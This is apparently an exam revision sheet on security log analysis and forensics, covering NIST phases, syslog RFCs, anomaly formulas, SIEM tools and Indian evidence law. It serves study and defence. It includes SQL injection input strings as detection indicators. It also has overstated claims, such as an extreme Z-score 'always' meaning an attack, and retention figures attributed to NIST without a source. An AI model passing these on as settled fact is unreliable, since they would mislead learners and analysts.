- **NIST 5-Phase Model:** Identify → Collect → Store → Analyze → Report.

- **NIST Retention:** **90 days online, 1 year archive**.

- **Syslog RFCs:** **RFC 3164** (BSD, 1024-byte limit) vs. **RFC 5424** (modern, structured data, no practical size limit).

- **Z-Score Formula:** $Z = (X - \mu) / \sigma$; **$Z > 3$** is anomalous.

- **EPS Formula:** $\text{EPS} = N / \Delta T$ — used for DDoS detection thresholds.

- **Chain of Custody:** Always SHA-256 hash + read-only storage + access log + case file documentation.

- **Brute-Force Indicator:** Same `src_ip` + many failed logins in short window + at least one success.

- **SQLi Indicator:** `'` or `UNION SELECT` or `OR '1'='1` in URI field of `access.log`.

- **C2 Beaconing Indicator:** Periodic small connections (e.g., every 60s) to a single unknown IP in firewall/NetFlow logs.

- **SIEM Tools:** Wazuh, OSSEC, Security Onion, ELK Stack, Graylog.

- **Log Format Mastery:** Apache `access.log` fields `%h %l %u %t "%r" %>s %b` — know each.

- **Indian Legal Context:** Evidence admissible under **Section 65B of Bharatiya Sakshya Adhiniyam 2023** (formerly Indian Evidence Act); relevant IPC/IT Act sections **§65, §66, §66F**.

- **Practical Lab Command:** `sha256sum <logfile>` is the gold-standard integrity command in KTU lab exams.

- **Correlation Dimensions:** **Temporal** (same time), **Asset-based** (same host), **Application-based** (same transaction).

- **3-2-1 Backup Rule:** 3 copies, 2 media, 1 offsite — memorize for storage questions.

- **Avid Reader Note:** A $Z = 25$ or more in real-world log analysis **always** indicates an attack — not noise. Do not dismiss extreme Z-scores as "probably false positive".
